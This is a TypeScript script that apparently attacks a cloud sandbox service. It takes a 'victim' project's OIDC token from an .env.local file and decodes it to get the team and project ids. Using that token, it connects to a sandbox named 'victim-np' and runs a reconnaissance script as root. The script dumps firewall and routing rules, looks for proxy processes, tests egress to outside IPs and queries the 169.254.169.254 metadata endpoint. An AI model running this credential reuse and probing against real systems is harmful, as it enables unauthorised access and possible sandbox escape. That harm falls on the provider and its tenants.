import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "===== iptables filter ====="
iptables -S 2>&1 | head -40
echo "===== iptables nat ====="
iptables -t nat -S 2>&1 | head -40
echo "===== iptables mangle ====="
iptables -t mangle -S 2>&1 | head -40
echo "===== nft ====="
nft list ruleset 2>&1 | head -60
echo "===== ip rule / routes ====="
ip rule show 2>&1
ip route show table all 2>&1 | head -40
echo "===== netns of self ====="
readlink /proc/self/ns/net
echo "===== firewalld-like procs ====="
ps aux 2>/dev/null | grep -aE "ferrox|firewall|nft|iptables|proxy|forward" | grep -av grep | head -20
echo "===== test egress to internet IP ====="
timeout 4 curl -s -o /dev/null -w "codercode: %{http_code} time: %{time_total}\\n" https://8.8.8.8/ 2>&1 | head -2
timeout 4 curl -s -o /dev/null -w "1.1.1.1: %{http_code} time: %{time_total}\\n" http://1.1.1.1/ 2>&1 | head -2
timeout 4 curl -s -o /dev/null -w "applesecure: %{http_code}\\n" --max-time 4 https://applesecure.com/ 2>&1 | head -2
timeout 4 curl -s -o /dev/null -w "google: %{http_code}\\n" --max-time 4 https://www.google.com/ 2>&1 | head -2
echo "===== connection refused MMDS retest (with ip addr) ====="
ip addr 2>&1 | head -20
ip route 2>&1 | head -10
timeout 3 curl -sv --max-time 3 http://169.254.169.254/latest/meta-data 2>&1 | tail -8
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore15.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore15.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });